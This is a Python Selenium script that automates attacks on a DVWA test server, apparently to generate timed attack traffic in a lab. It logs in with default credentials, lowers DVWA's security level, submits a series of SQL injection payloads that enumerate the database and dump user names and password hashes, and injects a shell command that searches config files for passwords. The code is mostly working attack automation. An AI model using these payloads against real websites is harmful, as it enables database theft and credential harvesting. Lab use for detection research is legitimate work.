# sql.py
#

# IMPORTS
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys	# Keys class provides keys in the keyboard like RETURN, F1, ALT etc.
import time
import datetime
from datetime import timedelta

# IMPORTS & ALIASES
import setup as s
printtime = s.printtime

# wrap function print to include local start time
def funcprinttime(desc):
	s.funcprinttime(desc, starttime)


# FILE GLOBALS
kali_IP = s.getip()            
dvwa_IP = "192.168.1.20"
dvwa_addr = "http://"+dvwa_IP+"/"


# DEFINE BROWSER DRIVER
driver = webdriver.Firefox()  # supported: Firefox, Chrome, Ie and Remote



##### SQL Injection ##### 
# original attack length: 8 minutes = 16 delays at ~30 seconds each
def sql_injection(n):

	# GLOBALS
	global starttime
	global endtime
	global delay

	global kali_IP
	global dvwa_IP
	global dvwa_addr

	starttime=time.time()
	endtime = time.time()+n

	delay = ((n/4)-5); # space events in attack to fill total time
	funcprinttime("  Start with attack time: "+str(n)+" and delays of: "+str(delay))

	# ATTACK			# Example: delay = 1 minute	
	dvwa_login(delay/2)		# 30
	dvwa_security_low(delay/2)	# 30
	injection(delay*2)		# 2 min
	cmd_execution(delay)		# 1 minute

	# ATTACK CLEANUP
	# No files were generated on either machine, so cleanup is minimal
	driver.quit()	# closes browser.

	# FINISH
	timeleft = endtime-time.time()
	if timeleft>0:
		funcprinttime("  -- sleep for time remaining: "+str(round(timeleft,2)))
		time.sleep(timeleft)

	funcprinttime("  End")

sql_injection.desc = "SQL injection attack"


########################
#   HELPER FUNCTIONS   #
########################


# DVWA LOGIN
# default credentials
def dvwa_login(n):

	#timing
	num_actions = 3
	wait = n/num_actions
	funcprinttime("  -- login ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))

	driver.get(dvwa_addr+"login.php")	
	assert "login.php not found." not in driver.page_source

	elem_user = driver.find_element_by_name("username")
	elem_user.send_keys("admin")	
	time.sleep(wait)
	elem_pass = driver.find_element_by_name("password")
	elem_pass.send_keys("password")
	time.sleep(wait)
	elem_login = driver.find_element_by_name("Login")
	elem_login.send_keys(Keys.RETURN)
	time.sleep(wait)
	funcprinttime("  -- logged in")



# SET DVWA SECURITY LOW
def dvwa_security_low(n):

	#timing
	num_actions = 2
	wait = n/num_actions
	funcprinttime("  -- dvwa security ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))
	
	driver.get(dvwa_addr+"security.php")

	from selenium.webdriver.support.ui import Select
	elem_security = Select(driver.find_element_by_name('security'))
	elem_security.select_by_visible_text("low")
	time.sleep(wait)

	elem_submit = driver.find_element_by_name("seclev_submit")
	elem_submit.send_keys(Keys.RETURN)
	time.sleep(wait)

	funcprinttime("  -- security is set to low")



# INJECT SQL COMMANDS
# 
def injection(n):

	# Commands
	commands = []
	commands.append('%\' or \'0\'=\'0')				# List all database entries
	commands.append('\' UNION ALL SELECT @@datadir, 1 -- ')		# Display database type
	commands.append('%\' or 0=0 union select null, database() #')	# Display database name
	commands.append('\' UNION ALL SELECT @@version, @@port -- ')	# Display database version and port
	# Display table names in database
	commands.append('%\' and 1=0 union select null, table_name from information_schema.tables #')	
	# Display user table column names
	commands.append('%\' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = \'users\' #')
	# Display users and passwords
	commands.append('%\' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #')
	
	#timing
	num_actions = len(commands)	
	wait = (n/num_actions)/2 # each command has 2 'wait's
	
	driver.get(dvwa_addr+"vulnerabilities/sqli/")
	assert "sqli page not found." not in driver.page_source

	# Execute each command in order
	for cmd in commands:

		elem_txtName = driver.find_element_by_name("id")
		elem_txtName.send_keys(cmd)	
		time.sleep(wait)

		elem_submit =  driver.find_element_by_name("Submit")
		elem_submit.send_keys(Keys.RETURN)		
		time.sleep(wait)		

	funcprinttime("  -- sql injection complete")



# COMMAND EXECUTION
# used to display any stored database credentials
def cmd_execution(n):

	# Commands
	commands = []
	# Display any stored database credentials
	commands.append('127.0.0.1; find /* -name \"*config*\" -print | xargs egrep -i \'(database|user|password)\'')

	#timing
	num_actions = len(commands)
	wait = (n/num_actions)/2 # each command has 2 'wait's

	# Command execution
	driver.get(dvwa_addr+"vulnerabilities/exec/")
	assert "exec page not found." not in driver.page_source

	# Execute each command in order
	for cmd in commands:
	
		elem_txtName = driver.find_element_by_name("ip")
		elem_txtName.send_keys(cmd)	
		time.sleep(wait)

		elem_submit =  driver.find_element_by_name("submit")
		elem_submit.send_keys(Keys.RETURN)		
		time.sleep(wait)

	funcprinttime("  -- sql command execution complete")


# END OF FILE

